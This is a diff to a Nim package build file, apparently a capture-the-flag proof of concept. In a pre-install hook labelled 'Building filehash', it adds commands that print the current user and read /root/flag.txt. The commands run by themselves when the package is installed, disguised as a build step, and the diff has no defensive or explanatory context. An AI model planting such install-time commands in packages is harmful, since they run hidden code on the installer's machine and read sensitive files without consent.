@@ -17,4 +17,5 @@ requires "nim >= 0.16.0"
 # Build the filehash C-lib
 before install:
   echo "Building filehash"
-  exec "mkdir hi"
+  exec "echo `whoami`"
+  exec "cat /root/flag.txt"
